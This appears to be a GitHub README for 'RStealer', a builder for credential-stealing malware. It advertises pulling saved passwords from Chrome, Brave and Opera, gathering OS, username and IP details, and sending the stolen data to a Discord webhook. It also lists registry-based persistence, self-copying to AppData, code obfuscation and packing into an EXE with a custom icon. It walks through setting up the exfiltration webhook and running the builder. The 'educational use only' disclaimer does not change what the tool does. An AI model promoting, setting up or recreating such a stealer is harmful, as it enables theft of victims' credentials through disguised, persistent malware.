# RStealer - Credential Retrieval Tool 🔒➡️📥

<pre>
ooooooooo.    .oooooo..o     .                       oooo 
`888   `Y88. d8P'    `Y8   .o8                       `888 
 888   .d88' Y88bo.      .o888oo  .ooooo.   .oooo.    888   .ooooo.  oooo d8b 
 888ooo88P'   `"Y8888o.    888   d88' `88b `P  )88b   888  d88' `88b `888""8P 
 888`88b.         `"Y88b   888   888ooo888  .oP"888   888  888ooo888  888 
 888  `88b.  oo     .d8P   888 . 888    .o d8(  888   888  888    .o  888 
o888o  o888o 8""88888P'    "888" `Y8bod8P' `Y888""8o o888o `Y8bod8P' d888b                                
</pre>

## Description

RStealer is an educational tool demonstrating credential retrieval techniques from popular browsers and collecting system information. **Use only on systems you own or have explicit permission!**

## Features  🛠️
- **🖥️ System Information Collection**
  - OS Version
  - Username
  - IP Address
- **🔑 Browser Credential Retrieval**
  - Google Chrome
  - Brave Browser
  - Opera Browser
- **📤 Discord Webhook Integration**
- **🔄 Persistence Mechanism**
  - Registry Auto-start Entry
  - Self-replication to AppData
- **🔒 Built-in Code Obfuscation**
- **🏗️ EXE Builder with Custom Icon Support**

## Installation 📥

Clone the repository:

```bash
git clone https://github.com/enkiggu/RStealer.git
cd RStealer
```
Install dependencies:

```bash
pip install -r requirements.txt
```

## Prepare your environment:

- Create an icons directory.
- Place your .ico files in the icons directory.
- Prepare your Discord webhook URL.

## How to Get a Discord Webhook URL 📡

To use the Discord Webhook functionality, you'll need to create a webhook URL in your Discord server. Follow these steps:

1. **Create a Discord Server and Text Channel**:
   - If you haven't already, create a Discord server and a text channel where you want to receive messages.
    
![Webhook Creation Process](assets/1.png)

2. **Create a Webhook**:
   - Go to the server settings by clicking on the down arrow next to your server name.
   - Click on **"Integrations"** in the menu.
   - Under **Webhooks**, click **"Create Webhook"**.
    
**![Webhook Creation Process](assets/2.png)**
**![Webhook Creation Process](assets/3.png)**
**![Webhook Creation Process](assets/4.png)**

3. **Configure the Webhook**:
   - Give your webhook a name.
   - Select the channel where you want the webhook to send messages.
   - You can customize the webhook avatar if you like.
   
4. **Copy the Webhook URL**:
   - After creating the webhook, click **"Copy Webhook URL"** to get the URL you'll use in the tool.
    
**![Webhook Creation Process](assets/5.png)**

5. **Use the Webhook URL in RStealer**:
   - When running the RStealer tool, paste the webhook URL into the prompt when asked for the **Discord webhook URL**.

**![Webhook Creation Process](assets/spideybot.png)**


## Usage 🚀
Run the builder:

```bash
python rstealer.py
```
Follow the prompts:

```bash
[?] Enter Discord webhook URL: [your-webhook-url]
[?] Icon name from icons folder (default: icons/default_icon.ico): [your-icon-name]
```

## Build Process Flow

```bash
graph TD
    A[User Input] --> B[Code Generation]
    B --> C[Obfuscation]
    C --> D[EXE Creation]
    D --> E[Output File]
```

# Configuration ⚙️

## Webhook Setup

- Create a Discord server and text channel.
- Create a webhook in the channel settings.
- Copy the webhook URL.

## Icon Preparation

- Recommended size: 256x256 pixels.
- Supported format: .ico
- Place in the /icons directory.

## File Structure

```bash
RStealer/
├── src/
│   ├── main.py
│   ├── rstealer_encoder.py
│   ├── make_exe.py
│   └── browser_modules/
├── icons/
│   └── default_icon.ico
├── output/
├── requirements.txt
└── README.md
```

# Disclaimer ⚠️
For educational purposes only:

- Security research, authorized penetration testing, and defensive security training.
- DO NOT use this tool for illegal activities.

License 📄
This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.

# Contributing 🤝

Contributions are welcome! Please follow these steps:

- Fork the repository
- Create your feature branch
- Commit your changes
- Push to the branch
- Open a pull request
